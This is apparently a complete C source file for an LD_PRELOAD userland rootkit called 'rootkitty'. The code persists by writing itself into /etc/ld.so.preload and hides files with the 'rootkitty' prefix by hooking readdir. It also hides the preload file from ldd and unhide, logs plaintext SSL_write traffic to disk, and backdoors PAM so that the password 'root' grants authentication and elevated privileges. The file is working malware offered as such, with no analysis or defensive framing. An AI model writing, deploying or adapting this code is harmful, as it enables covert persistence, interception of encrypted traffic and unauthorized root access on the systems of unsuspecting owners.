/*---------[ PREPROCESSOR ]---------*/
#pragma once
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <stdlib.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#define STR_LEN(str) sizeof(str)-1
#define MAGIC_PREFIX "rootkitty"
#define MAGIC_LEN STR_LEN(MAGIC_PREFIX)
#ifndef PAM_EXTERN
#define PAM_EXTERN extern 
#endif
/*---------[ PROTOTYPES ]---------*/
static struct dirent64* (*og_readdir64)(DIR *dir)  = NULL;
static struct dirent*   (*og_readdir)(DIR *)       = NULL;
static int (*og_SSL_write)(SSL*, const void*, int) = NULL;
static int (*og_pam_sm_auth)(pam_handle_t*, int, int, const char**) = NULL;
static int (*og_pam_sm_setcred)(pam_handle_t* pamh, int flags, int argc, const char** argv) = NULL;
static int (*og_execve)(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]) = NULL;

/*---------[ INITIALIZE THE HOOKS ]---------*/
__attribute__((constructor)) void hook_init(void){
  og_readdir    = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
  og_readdir64  = (struct dirent64* (*)(DIR*))dlsym(RTLD_NEXT, "readdir64");
  og_SSL_write  = (int (*)(SSL*, const void*, int))dlsym(RTLD_NEXT, "SSL_write");
  og_pam_sm_auth = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_authenticate");
  og_pam_sm_setcred = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_setcred");
  og_execve = (int (*)(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]))dlsym(RTLD_NEXT, "execve");
}
/*---------[ PERSISTENCE CHECK AND LD.SO.PRELOAD MANIPULATION ]---------*/
__attribute__((constructor)) void PersistCheck(void) {
  FILE* fd;
  FILE* temp_fd;
  Dl_info path;
  char line[255];
  char check[PATH_MAX]; // Make sure this is enough to store the path

  dladdr((void*)PersistCheck, &path);

  if (access("/etc/ld.so.preload", F_OK) == 0){
    // file exists, check if we are already written to the file
    fd = fopen("/etc/ld.so.preload", "r");
    if(fd == NULL) return;
    
    if (fgets(check, sizeof(check), fd) && strcmp(check, path.dli_fname) == 0){
      // we are already in the file, do not write again
      fclose(fd);
      return;
    }
    
    temp_fd = fopen("/tmp/rootkitty_tmp.txt", "w");
    if(temp_fd == NULL) {
      fclose(fd);
      return;
    }

    fprintf(temp_fd, "%s\n", path.dli_fname); // append the new line to separate entries

    while (fgets(line, sizeof(line), fd) != NULL) {
      fprintf(temp_fd, "%s", line);
    }

    fclose(fd);
    fclose(temp_fd);
    rename("/tmp/rootkitty_tmp.txt", "/etc/ld.so.preload");
  } else {
    // file doesn't exist, try to create it
    fd = fopen("/etc/ld.so.preload", "w");
    if (fd != NULL) {
      fprintf(fd, "%s\n", path.dli_fname); // append the new line for consistency
      fclose(fd); // Close file pointer if successfully opened
    }
  }
}
/*---------[ HOOK EXECVE TO HIDE THE LD.SO.PRELOAD FILE ]---------*/
int execve(const char *pathname, char *const argv[], char *const envp[]) {
  if (strcmp(pathname,"/bin/ldd")==0 || strcmp(pathname,"/bin/unhide")==0) {
    uid_t old_uid = getuid();
    seteuid(0);
    rename("/etc/ld.so.preload", "/etc/.ld.so.preload");  // Hide file
    sleep(2);
    rename("/etc/.ld.so.preload", "/etc/ld.so.preload"); // Restore file
    seteuid(old_uid); // Drop the privileges back to normal
  }
  return og_execve(pathname, argv, envp);
}
/*---------[ HIDING FILES ]---------*/
struct dirent* readdir(DIR *dirp){
  struct dirent* entry;

  while ((entry = og_readdir(dirp)) != NULL) {
    if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
      continue;    
    }
    return entry;
  }
  return entry;
}
// handle 64bit version
struct dirent64* readdir64(DIR* dirp) {
  struct dirent64* entry;

  while ((entry = og_readdir64(dirp)) != NULL) {
    if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
      continue;
    }
    return entry;
  }
  return entry;
}
/*---------[ INTERCEPTING SSL_WRITE ]---------*/ 
int SSL_write(SSL* ssl, const void *buf, int num) {
  FILE* fd = fopen("SSL_log.txt", "a+");
  if (fd != NULL){
    fprintf(fd, "PID:%d\n", getpid());
    fwrite(buf, 1, num, fd);
    fprintf(fd, "\n");
    fclose(fd);
  }
  return og_SSL_write(ssl, buf, num);
}
/*---------[ PAM BACKDOOR ]---------*/

int backdoor = 0;

// elevate privileges:
int elevation(){
  uid_t UID = getuid();
  gid_t GID = getgid();

  if (seteuid(0) == -1) {
    return -1;
  }
  if (setegid(0) == -1) {
    seteuid(UID);
    return -1;
  }
  return 0;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, const char** argv){
  const char* input_passwd;

  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);

  if (input_passwd != NULL && strcmp(input_passwd, "root") == 0) {
    backdoor = 1;
    return PAM_SUCCESS;
  }
  return og_pam_sm_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t* pamh, int flags, int argc, const char** argv){
  if (backdoor == 1){
    if(elevation() == 0){
      backdoor = 0;
      return PAM_SUCCESS;
    }
  }
  return og_pam_sm_setcred(pamh, flags, argc, argv);
}
